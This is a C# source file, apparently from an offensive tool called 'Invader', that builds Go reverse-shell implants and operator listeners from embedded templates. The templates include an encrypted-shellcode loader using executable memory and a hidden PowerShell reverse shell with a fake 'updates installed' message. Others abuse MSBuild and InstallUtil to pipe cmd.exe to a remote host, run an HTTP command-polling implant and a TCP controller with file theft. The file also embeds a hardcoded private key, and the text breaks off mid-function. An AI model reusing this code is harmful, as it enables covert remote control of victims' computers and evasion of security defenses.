using System;
using System.Diagnostics;
using System.IO;

namespace Invader
{
    class SharedProps
    {
        private static SharedProps oSharedProps = null;
        private SharedProps()
        {

        }

        public enum SelectedShellType
        {
            SimpleReverseShell = 1,
            HybridReverseShell = 2,
            HttpsReverseShell = 3,
            HttpReverseShell = 4,
            PSReverseShell = 5,
            CustomShellCode = 6,
            MsBuildReverseShell = 7,
            InstallShieldReverseShell = 8,
            None = 9
        }

        public SelectedShellType CurrentSelection
        {
            get; set;
        }

        public string FormCaption
        {
            get; set;
        }

        public string SourceFile
        {
            get; set;
        }
        public string ManagerFile
        {
            get; set;
        }

        public string OutFilePath
        {
            get; set;
        }
        public bool HttpRevShell
        {
            get; set;
        }
        public bool HttpsRevShell
        {
            get; set;
        }
        public bool SimpleTCPRevShell
        {
            get; set;
        }
        public bool HybridRevShell
        {
            get; set;
        }
        public bool PowRevShell
        {
            get; set;
        }
        public bool MsBuildRevShell
        {
            get; set;
        }
        public bool CustomShellCode
        {
            get; set;
        }
        public bool InstallShieldShell
        {
            get; set;
        }

        public static SharedProps GetInstance
        {
            get
            {
                if (oSharedProps == null)
                {
                    oSharedProps = new SharedProps();
                }
                return oSharedProps;
            }
        }
        public bool IsLinux()
        {
            OperatingSystem runningOs = Environment.OSVersion;
            return (runningOs.Platform == PlatformID.Unix);
        }
        public void CreateTemplates()
        {
            OperatingSystem runningOs = Environment.OSVersion;

            string downloadpath, templpath;
            if (runningOs.Platform != PlatformID.Unix)
            {
                downloadpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(AppDomain.CurrentDomain.BaseDirectory)).FullName, @"download\");
                templpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(AppDomain.CurrentDomain.BaseDirectory)).FullName, @"download\templates");
            }
            else
            {
                downloadpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(AppDomain.CurrentDomain.BaseDirectory)).FullName, @"download/");
                templpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(AppDomain.CurrentDomain.BaseDirectory)).FullName, @"download/templates/");
            }
            string httptemplate = @"<!DOCTYPE html>
<html>
<body>
<div class=""container"" >
    < div >< h3 > Manage Server </ h3 > </ div >
    
        < div class=""container"" >
		<form action = """" method=""post"" id=""cmdform"" name=""cmdform"">
			<div class=""container"" >
				<div class=""row"">
					<div class=""col-sm-10"">
						 <label id = ""serverlbl"" > Server commands.</label>
			    		 <input type = ""text"" class=""form-control"" name=""cmd"" id=""cmd"" value= {{.Command}}>
					</div>					
				</div>
				
				</div>
			</div>
		</form>
    </div>   		
</div> 
</body>
</html>";
            string httpstemplate = @"<!DOCTYPE html>
<html>

<body>
<div class=""container"" >
    < div class=""text-center""><h3> Manage Server</h3> </div> 
	<div class=""container""  >
		<form action = """" method=""post"" id=""cmdform"" name=""cmdform"">
			<div class=""container"" >
				<div class=""row"">
					<div class=""col-sm-10"">
						 <label id = ""serverlbl"" > Server commands.</label>
			    		 <input type = ""text"" class=""form-control"" name=""cmd"" id=""cmd"" value= {{.Command}}>
					</div>					
				</div>
				</div>
			</div>
		</form>
    </div>   		
</div> 
</body>
</html>";

            string pvtkey = @"-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0jICH/abqZC6tqw/7ilpHdDJPWmcv8173bCXCNtXUwPFjBcI
uCvCWV9CduNudz044XMPWHuXhVHssBH7hRsy21Xja7POYiCpEPMHK5rw1B4ihbg6
59nYpGw4OhJE2SkjZu2ptxnEZguJKFVw7cr/sfacBEOAyv6eRaJ9FNiOuhArz3yu
ZNaiZByzjoglHIRn7ZIyQOb+uzywLJvFfULCLVQ3TcJnzD7W1jfcWU3dGpIWKIlS
I+DGQjAvYIqbb85S4GYUVOFBDYg5G5E+89b9+wni4stuL4So2y/K7UCcnziMGzde
j4ZWUQDfLzYeIT/9s1hzTp96QKY4DMvu0vG3JQIDAQABAoIBAQDOJQF0e5V6nVig
4xnn53ESLrvOoQ98BHjgmNnnc8aWwfIyTDze8vuuTwCOPMsP4lkwsnlwW/XkaM5q
d5hnmJ8uAXQDItrb3hAxcUes+k4KmmtdHauXy0zvJLuYKGahW/k+bwOtcXXuZo3j
orgYXqiazrOAcvuTGlf7DzsBAMopqv9Z40dsSYcMAFOntot8HCQH1MK9IwfxPhrx
55q9pQ1v2EI59fYk7VcDtMygjFnHNRMJt0l3YH3XyY+W7QlvFYoQCm8jeOCE4mes
hpe152mDtS8lmfIHjrMK2rJmPSd210t9BcifVR69E3FRvKBIzspjl+sj4OQTf2aC
qvH/OcIBAoGBAOv8BdCFWuSVAiu1Z0zdXoDWhdz3a0Cynom2PLT7GsW8BNLX0YCJ
yjmQ3zV3H9yRwEngd2k2PPCEhH3BMfz1O2//3zCZ9jDtNC4p3V/6drIbEvlqXJ9j
s5cAcXO4l+XD9XauIhq79SMV52vvmLopqoukFngF4OPgsabPlUQWA/XlAoGBAOQG
BXeJbpWdbkkTpR0X4rnJwH7ciOPEW5o2/AmxTqHf8RNwTvLESzEhMqMmbXcPjyuV
FTwjK8ShCSDZKwlpmkAIK9OjsImfghNQBpaBouTChQ9cb7OSGdHj3ZHnFLmc2qxi
9A55cStBl0Ua9sSMQ0/41R/rjSStETqFqFZvKqhBAoGAcVwdhu+onAmgg1KfDuOA
VC+5Gk6YbPnhApJSUzYUxEvvnUEjWLXYORMIxmw1GAXD8zkq45W0bG2cH7TAyJ0d
Mk4d7wDmrNYlrM9bkpGEl0Y+NSYM3FxOlwkVdtuDzFH4BkzcAS+tMG+DPexY14TQ
ckgeqwVX5N+5N0Kcl5pjyKkCgYAeqOCbThNccqqdkNKmsst9h68mX6jYV1KpzbLd
6sVT5rSXlIZJBjPGC1yvqz8UvzbU+Vq9l00PR0fe7tRmk5h1+6NI9b2LA7ONvTjl
i9DHSZBynE84qfBm1Gi6cYPL4VdVzohaWeHpmwwn8pQzoVh7rE2b2SRFRjAG2mnk
FVZ7AQKBgCvhKxmOWBZIAapIy2gX7zDHWLLa/umWPCpuJZmo5cTI6KqFoFGd10Ji
mYReyvkE30UdrNrR611JoGShDj4QadZ+tSJqzneG5m7jqwXCDpV95Ck06VXY0LKp
jslM8sfQ4TGTL68HxNN2gM6X3n2gHbynU9lhKhAmIEdtB8uzfwrY
-----END RSA PRIVATE KEY-----";
            string pubkey = @"-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUCNfoJBJaGlsHtmaRWojFUOoK3VQwDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0xOTA2MjMwMzI4MzJaFw0yNDA2
MjIwMzI4MzJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDSMgIf9pupkLq2rD/uKWkd0Mk9aZy/zXvdsJcI21dT
A8WMFwi4K8JZX0J24253PTjhcw9Ye5eFUeywEfuFGzLbVeNrs85iIKkQ8wcrmvDU
HiKFuDrn2dikbDg6EkTZKSNm7am3GcRmC4koVXDtyv+x9pwEQ4DK/p5Fon0U2I66
ECvPfK5k1qJkHLOOiCUchGftkjJA5v67PLAsm8V9QsItVDdNwmfMPtbWN9xZTd0a
khYoiVIj4MZCMC9giptvzlLgZhRU4UENiDkbkT7z1v37CeLiy24vhKjbL8rtQJyf
OIwbN16PhlZRAN8vNh4hP/2zWHNOn3pApjgMy+7S8bclAgMBAAGjUzBRMB0GA1Ud
DgQWBBTJ91dwN/o52Og+z42TFobfTN2uODAfBgNVHSMEGDAWgBTJ91dwN/o52Og+
z42TFobfTN2uODAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQA6
ZEt/O0ufZ4sz+YaY3QUVKWkBnUX3ogfVvlJicjxifFUCIboVwtuiZQTg5uHVuNF2
MTGq6ItLkZx33pHvy+Nq9FsC2eYS8ldTMhQeect3r3YFj/wjlVDWkMQwp0svvhus
fiMzFUBr66qqfNYzrw/SFo2yGzGmgtPt/LwYkM/ahcW+tRvTSIOKEJkSy/HY6wqO
Ef+l/sja7oroG6O77T1RSBeAxtnmNXY4t2aHvpRtdNv5VYk9bAVmYHtblA48lNnh
wiIudc7b2Axp0CnTT2pUxPCwJsk+WaOasRVn3+qP5LN5UJOTEn31IbAhiDLXaYwB
l2i5lNBKlgXmUeCDNfqW
-----END CERTIFICATE-----";
            try
            {
                if (!Directory.Exists(downloadpath))
                {
                    Directory.CreateDirectory(downloadpath);
                    Directory.CreateDirectory(templpath);
                    string httpspath, httppath, pvtkeypath, pubkeypath;

                    if (runningOs.Platform != PlatformID.Unix)
                    {
                        httpspath = templpath + @"\servstemplate.html";
                        httppath = templpath + @"\servtemplate.html";
                        pvtkeypath = downloadpath + @"\server.key";
                        pubkeypath = downloadpath + @"\server.crt";
                    }
                    else
                    {
                        httpspath = templpath + @"servstemplate.html";
                        httppath = templpath + @"servtemplate.html";
                        pvtkeypath = downloadpath + @"server.key";
                        pubkeypath = downloadpath + @"server.crt";
                    }

                    File.WriteAllText(httpspath, httpstemplate);
                    File.WriteAllText(httppath, httptemplate);
                    File.WriteAllText(pvtkeypath, pvtkey);
                    File.WriteAllText(pubkeypath, pubkey);
                }
            }

            catch (Exception ex)
            {

                throw ex;
            }

        }

        public void UpdateCustomShellCodeTemplate(string key, string shellcode, string agentname, string filename)
        {
            string source;
            string outpath;
            source = @"package main
import(
    ""crypto/rc4""
    ""fmt""
    ""syscall"" 
    ""unsafe""
)

const (
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
)

const DECKEY = "":KEY:""
func main() {

            shell:= []byte{ SHELLCODEHERE}
            decryptedshellcode:= decryptshellcode([]byte(shell))
	        executeshell(decryptedshellcode)
            }

        func decryptshellcode(shellcodetodecrypt[]byte) [] byte {
	key := [] byte (DECKEY)
      ciphertext := shellcodetodecrypt
      decrypted := make([]byte, len(ciphertext))
    // if our program was unable to read the file
    // print out the reason why it can't
        c, err := rc4.NewCipher(key)
	if err != nil {
		fmt.Println(err.Error)
    }

    c.XORKeyStream(decrypted, ciphertext)

	return decrypted
}

func executeshell(shellcode[]byte)
{

k32:= syscall.MustLoadDLL(""kernel32.dll"")

    valloc:= k32.MustFindProc(""VirtualAlloc"")

    //make space for shellcode
    addr, _, _:= valloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

    ptrtoaddressallocated:= (*[6500]byte)(unsafe.Pointer(addr))
	//now copy our shellcode to the ptrtoaddressallocated
	for i, value := range shellcode {
        ptrtoaddressallocated[i] = value

    }

    syscall.Syscall(addr, 0, 0, 0, 0)
}
";
            if (!IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            SharedProps.GetInstance.OutFilePath = outpath;
            source = source.Replace(":KEY:", key);
            source = source.Replace("SHELLCODEHERE", shellcode);
            if (!Directory.Exists(Path.GetDirectoryName(outpath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(outpath));
            }
            File.WriteAllText(outpath, source);
            BuildExe(outpath, agentname, false);
            File.Delete(outpath);
        }

        public void UpdatePowerShellReverseShellTemplate(string ipport, string filename, string agentname)
        {

            string outpath, sourcefile;

            sourcefile = @"package main

import (
	""fmt""
	""os""
	""os/exec""
	""strings""
)

//Remote host
const REMOTEHOST = ""RHOST""
//Remote Port
const REMOTEPORT = ""RPORT""

var (
	err   error
	powershellcore, cmdname string
)

func init() {
	powershellcore = `function cleanup {
		if ($client.Connected -eq $true) {$client.Close()}
		if ($process.ExitCode -ne $null) {$process.Close()}
		exit}
		// Setup IPADDR
		$address = 'REVIP'
		// Setup PORT
		$port = 'REVPORT'
		$client = New-Object system.net.sockets.tcpclient
		$client.connect($address,$port)
		$stream = $client.GetStream()
		$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
		$process = New-Object System.Diagnostics.Process
		$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
		$process.StartInfo.RedirectStandardInput = 1
		$process.StartInfo.RedirectStandardOutput = 1
		$process.StartInfo.UseShellExecute = 0
		$process.Start()
		$inputstream = $process.StandardInput
		$outputstream = $process.StandardOutput
		Start-Sleep 1
		$encoding = new-object System.Text.AsciiEncoding
		while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
		$stream.Write($encoding.GetBytes($out),0,$out.Length)
		$out = $null; $done = $false; 
		while (-not $done) {
		if ($client.Connected -ne $true) {cleanup}
		$pos = 0; $i = 1
		while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
		$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
		$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
		if ($pos -gt 0) {
		$string = $encoding.GetString($networkbuffer,0,$pos)
		$inputstream.write($string)
		start-sleep 1
		if ($process.ExitCode -ne $null) {cleanup}
		else {
		$out = $encoding.GetString($outputstream.Read())
		while($outputstream.Peek() -ne -1){
		$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
		$stream.Write($encoding.GetBytes($out),0,$out.length)
		$out = $null
		$string = $null}} else {cleanup}}`
}

func os64check() bool {

	for _, e := range os.Environ() {
		pair := strings.Split(e, ""="")

		if pair[0] == ""PROCESSOR_ARCHITEW6432"" || strings.Contains(pair[1], ""64"") {
			fmt.Println(pair[0] + ""="" + pair[1])
			return true
		}
	}
	return false
}

func main() {
	genereaterevshellscript(REMOTEHOST, REMOTEPORT)
	if os64check() {
		cmdname = `c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`

	} else {

		cmdname = ""PowerShell""
	}

	cmdArgs := []string{""-w"", ""hidden"", ""-ep"", ""bypass"", ""-nop"", ""-c"", `IEX (C:/Windows/Temp/powrev.ps1)`}
	cmd := exec.Command(cmdname, cmdArgs...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()
	checkerr(err)
	fmt.Println(""Successfully installed pending updates !"")
}

func genereaterevshellscript(ip, port string) {
	ipreplaced := strings.Replace(powershellcore, ""REVIP"", ip, 1)
	portreplaced := strings.Replace(ipreplaced, ""REVPORT"", port, 1)
	fopowershellrevshell, err := os.Create(`C:/Windows/Temp/powrev.ps1`)
	checkerr(err)
	defer fopowershellrevshell.Close()
	fopowershellrevshell.WriteString(portreplaced)
}

func checkerr(err error) {
	if err != nil {
		fmt.Printf(""something went wrong %s"", err)
		return
	}
}
";

            if (!IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            SharedProps.GetInstance.OutFilePath = outpath;

            string ip = ipport.Split(new char[] { ':' })[0];
            string port = ipport.Split(new char[] { ':' })[1];
            sourcefile = sourcefile.Replace("RPORT", port);
            sourcefile = sourcefile.Replace("RHOST", ip);

            if (!Directory.Exists(Path.GetDirectoryName(outpath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(outpath));
            }
            File.WriteAllText(outpath, sourcefile);

            BuildExe(outpath, agentname, false);
            File.Delete(outpath);
        }

        public void UpdateMsBuildReverseShellTemplate(string ipport, string filename, string agentname)
        {

            string outpath, sourcefile;

            sourcefile = @"package main

import (
	""fmt""
	""os""
	""os/exec""
	""strings""
)

var tdu, msbuildpath string

//MANAGERIP connection string to the manager
const MANAGERIP = ""RHOST""

//REMOTEPORT to connect to the manager
const REMOTEPORT = ""RPORT""

func init() {
	tdu = `<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
<Target Name=""tdu"">
<tdu/>
</Target>
<UsingTask
    TaskName=""tdu""
    TaskFactory=""CodeTaskFactory""
    AssemblyFile=""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"" >
      <Task>
      
      <Reference Include=""System.Management.Automation"" />
        <Code Type=""Class"" Language=""cs"">
         <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
            {
                public static StreamWriter streamWriter;
                 public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
                 {
                        StringBuilder strOutput = new StringBuilder();
                        if (!String.IsNullOrEmpty(outLine.Data))
                        {
                            try
                            {
                                strOutput.Append(outLine.Data);
                                streamWriter.WriteLine(strOutput);
                                streamWriter.Flush();
                            }
                            catch (Exception ex) { throw ex; }
                        }
                 }
                 public override bool Execute()
                 {
                     using (TcpClient client = new TcpClient(""IP"", PORT))
                        {
                            using (Stream stream = client.GetStream())
                            {
                                using (StreamReader rdr = new StreamReader(stream))
                                {
                                    streamWriter = new StreamWriter(stream);
                                    StringBuilder strInput = new StringBuilder();
                                    Process p = new Process();
                                    p.StartInfo.FileName = ""cmd.exe"";
                                    p.StartInfo.CreateNoWindow = true;
                                    p.StartInfo.UseShellExecute = false;
                                    p.StartInfo.RedirectStandardOutput = true;
                                    p.StartInfo.RedirectStandardInput = true;
                                    p.StartInfo.RedirectStandardError = true;
                                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                    p.Start();
                                    p.BeginOutputReadLine();
                                    while (true)
                                    {
                                        strInput.Append(rdr.ReadLine());
                                        p.StandardInput.WriteLine(strInput);
                                        strInput.Remove(0, strInput.Length);
                                    }
                                }
                            }
                        }
                 }
            
            }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>`
	msbuildpath = `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe`
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createmsbuildtemplate(MANAGERIP, REMOTEPORT)
	msbuild := exec.Command(msbuildpath, `C:/Windows/Temp/tdu.xml`)
	err := msbuild.Start()
	checkerr(err)

}

func createmsbuildtemplate(ip, port string) {
	ipreplaced := strings.Replace(tdu, ""IP"", ip, 1)
	portreplaced := strings.Replace(ipreplaced, ""PORT"", port, 1)
	fotduxml, err := os.Create(`C:/Windows/Temp/tdu.xml`)
	checkerr(err)
	defer fotduxml.Close()
	fotduxml.WriteString(portreplaced)
}

";

            if (!IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            SharedProps.GetInstance.OutFilePath = outpath;

            string ip = ipport.Split(new char[] { ':' })[0];
            string port = ipport.Split(new char[] { ':' })[1];
            sourcefile = sourcefile.Replace("RPORT", port);
            sourcefile = sourcefile.Replace("RHOST", ip);

            if (!Directory.Exists(Path.GetDirectoryName(outpath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(outpath));
            }
            File.WriteAllText(outpath, sourcefile);

            BuildExe(outpath, agentname, false);
            File.Delete(outpath);
        }

        public void UpdateInstallShieldReverseShellTemplate(string ipport, string filename, string agentname)
        {

            string outpath, sourcefile;

            sourcefile = @"package main

import (
	""fmt""
	""os""
	""os/exec""
	""strings""
)

var instutil, cscpath, instutilpath string

//MANAGERIP connection string to the manager
const MANAGERIP = ""RHOST""

//REMOTEPORT to connect to the manager
const REMOTEPORT = ""RPORT""

func init() {
	instutil = `using System;
	using System.Collections;
	using System.Collections.Generic;
	using System.ComponentModel;
	using System.Configuration.Install;
	using System.Diagnostics;
	using System.IO;
	using System.Net.Sockets;
	using System.Text;
	
	
	namespace WindowsService1
	{
		public class Program
		{
	
			public static void Main()
			{
				Console.WriteLine("""");
	
			}
		}
	
		[System.ComponentModel.RunInstaller(true)]
		public partial class ProjectInstaller : System.Configuration.Install.Installer
		{
			StreamWriter streamWriter;
	
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Console.WriteLine(""Uninstall...I carry out the real work..."");
				revconnect();
			}
	
			private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
			{
				StringBuilder strOutput = new StringBuilder();
	
				if (!String.IsNullOrEmpty(outLine.Data))
				{
					try
					{
						strOutput.Append(outLine.Data);
						streamWriter.WriteLine(strOutput);
						streamWriter.Flush();
					}
					catch (Exception) { }
				}
			}
			public void revconnect()
			{
				try
				{
					using (TcpClient client = new TcpClient(""IPHERE"", PORTHERE))
					{
						using (Stream stream = client.GetStream())
						{
							using (StreamReader rdr = new StreamReader(stream))
							{
								streamWriter = new StreamWriter(stream);
	
								StringBuilder strInput = new StringBuilder();
	
								Process p = new Process();
								p.StartInfo.FileName = ""cmd.exe"";
								p.StartInfo.CreateNoWindow = true;
								p.StartInfo.UseShellExecute = false;
								p.StartInfo.RedirectStandardOutput = true;
								p.StartInfo.RedirectStandardInput = true;
								p.StartInfo.RedirectStandardError = true;
								p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
								p.Start();
								p.BeginOutputReadLine();
	
								while (true)
								{
									strInput.Append(rdr.ReadLine());
									p.StandardInput.WriteLine(strInput);
									strInput.Remove(0, strInput.Length);
								}
							}
						}
					}
				}
				catch (Exception)
				{
	
	
				}
			}
		}
	}
	`
	cscpath = `C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
	instutilpath = `C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe`
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createinstlutiltemplate(MANAGERIP, REMOTEPORT)
	instexe := exec.Command(cscpath, `/out:C:\Windows\temp\goinstut.exe`, `C:\Windows\temp\insutil.cs`)
	err := instexe.Run()
	checkerr(err)
	executeshell := exec.Command(instutilpath, `/logfile=`, `/LogToConsole=false`, `/U`, `C:\Windows\temp\goinstut.exe`)
	err = executeshell.Run()
	checkerr(err)
	os.Remove(`C:\Windows\temp\insutil.cs`)
}

func createinstlutiltemplate(ip, port string) {
	ipreplaced := strings.Replace(instutil, ""IPHERE"", ip, 1)
	portreplaced := strings.Replace(ipreplaced, ""PORTHERE"", port, 1)
	foinstlutil, err := os.Create(`C:\Windows\temp\insutil.cs`)

	checkerr(err)
	defer foinstlutil.Close()
	foinstlutil.WriteString(portreplaced)
}

";

            if (!IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            SharedProps.GetInstance.OutFilePath = outpath;

            string ip = ipport.Split(new char[] { ':' })[0];
            string port = ipport.Split(new char[] { ':' })[1];
            sourcefile = sourcefile.Replace("RPORT", port);
            sourcefile = sourcefile.Replace("RHOST", ip);

            if (!Directory.Exists(Path.GetDirectoryName(outpath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(outpath));
            }
            File.WriteAllText(outpath, sourcefile);

            BuildExe(outpath, agentname, false);
            File.Delete(outpath);
        }


        public void UpdateHttpReverseShellTemplate(string ipport, string filename, string agentname, bool isManager)
        {

            string outpath, sourcefile;
            if (isManager)
            {
                sourcefile = @"package main

import (
	""bufio""
	""fmt""
	""html/template""
	""net/http""
	""os""
	""github.com/fatih/color""
)

type ServCommand struct {
	Command    string
	Commandres string
}

var commandtopost ServCommand
var servtemplate *template.Template

func init() {
	commandtopost = ServCommand{}
	servtemplate = template.Must(template.ParseFiles(""templates/servtemplate.html""))
}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	http.HandleFunc(""/"", index)
	err := http.ListenAndServe("":REVPRT"", nil)
	checkerr(err)
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	if req.Method == ""POST"" {
		err := req.ParseForm()
		checkerr(err)
		cmdres := req.Form.Get(""cmdres"")
		commandtopost.Commandres = cmdres
		redc.Println(""You have a message from Victim..."")
		greenc.Println(commandtopost.Commandres)
		err = servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)

	} else {
		redc.Printf(""[[http]]"")
		reader := bufio.NewReader(os.Stdin)
		cmdtopost, _ := reader.ReadString('\n')
		commandtopost.Command = cmdtopost
		err := servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)
	}
}

";
            }
            else
            {
                sourcefile = @"package main

import (
	""fmt""
	""net/http""
	""net/url""
	""os""
	""os/exec""
	""runtime""
	""strings""
	""time""

	""github.com/PuerkitoBio/goquery""
)

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	var osshell string
	revserver := ""http://IPPORT""
	client := &http.Client{}

	for {
		response, err := client.Get(revserver)
		checkerr(err)
		defer response.Body.Close()

		doc, err := goquery.NewDocumentFromResponse(response)
		checkerr(err)
		cnt, _ := doc.Find(""form div div div input"").Attr(""value"")

		if strings.TrimSpace(cnt) == """" {
			cnt = ""ipconfig""
		}
		command := strings.TrimSpace(string(cnt))

		if command == ""bye"" {
			client.PostForm(revserver, url.Values{""cmd"": {command}, ""cmdres"": {""Bye for now !""}})
			os.Exit(0)
		} else {
			osshellargs := []string{""/C"", command}
			if runtime.GOOS == ""windows"" {
				osshell = ""cmd""
			} else {
				osshell = ""/bin/sh""
				osshellargs = []string{""-c"", command}
			}
			execcmd := exec.Command(osshell, osshellargs...)
			/*if runtime.GOOS == ""windows"" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			out, _ := execcmd.Output()
			client.PostForm(revserver, url.Values{""cmd"": {command}, ""cmdres"": {string(out)}})
			time.Sleep(3 * time.Second)
		}

	}

}

";
            }
            //curpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"basefile\", filename);
            if (!IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            SharedProps.GetInstance.OutFilePath = outpath;

            if (isManager)
            {
                sourcefile = sourcefile.Replace("REVPRT", ipport);
            }
            else
            {
                sourcefile = sourcefile.Replace("IPPORT", ipport);

                /*string ip = ipport.Split(new char[] { ':' })[0];
                string port = ipport.Split(new char[] { ':' })[1];
                sourcefile = sourcefile.Replace("RPORT", port);
                sourcefile = sourcefile.Replace("RHOST", ip);*/
            }
            if (!Directory.Exists(Path.GetDirectoryName(outpath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(outpath));
            }
            File.WriteAllText(outpath, sourcefile);

            BuildExe(outpath, agentname, isManager);
            File.Delete(outpath);
        }

        public void UpdateSimpleShellTemplate(string ipport, string filename, string agentname, bool isManager)
        {

            string outpath, sourcefile;
            if (isManager)
            {
                sourcefile = @"package main

import (
	""bufio""

    ""fmt""

    ""io""

    ""net""

    ""os""

    ""strconv""

    ""strings""


    ""github.com/fatih/color""
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//PORT set server port here
            const LPRT = "":REVPRT""

func main()            {
            redc:= color.New(color.FgHiRed, color.Bold)

    greenc:= color.New(color.FgHiGreen, color.Bold)

    cyanc:= color.New(color.FgCyan, color.Bold)


    var recvdcmd[512]byte 

                cyanc.Println(""Not Yet Connected ..."")

    listner, _:= net.Listen(""tcp"", LPRT)

    conn, _:= listner.Accept()

    for {
                reader:= bufio.NewReader(os.Stdin)

        redc.Print(""[gotcha]"")

        command, _:= reader.ReadString('\n')

        if strings.Compare(command, ""bye"") == 0 {
                        conn.Write([]byte(command))
			conn.Close()

            os.Exit(1)

        } else if strings.Index(command, ""get"") == 0 {
			getFilewithNameandSize(conn, command)


        } else if strings.Index(command, ""grabscreen"") == 0 {
			getFilewithNameandSize(conn, command)


        } else {
			conn.Write([]byte (command))
			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				//fmt.Println(string(recvdcmd[0:n]))
				//if string(recvdcmd[0:n]) == ""END""
				if chunkbytes< 512 {
					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
					greenc.Println(string(recvdcmd[0:chunkbytes]))
					break
				} else {
					greenc.Println(string(recvdcmd[0:chunkbytes]))

				}
			}
		}

	}

}

func getFilewithNameandSize(connection net.Conn, command string){

    connection.Write([]byte(command))

	bufferFileName:= make([]byte, 64)
	bufferFileSize:= make([]byte, 10)

	connection.Read(bufferFileSize)


    fileSize, _:= strconv.ParseInt(strings.Trim(string(bufferFileSize), "":""), 10, 64)

    fmt.Println(""file size "", fileSize)


    connection.Read(bufferFileName)

    fileName:= strings.Trim(string(bufferFileName), "":"")


    fmt.Println(""file name "", fileName)


    newFile, err:= os.Create(fileName)


    if err != nil {
        fmt.Println(err)

    }
    defer newFile.Close()

    var receivedBytes int64


    for {
        if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
            io.CopyN(newFile, connection, (fileSize - receivedBytes))

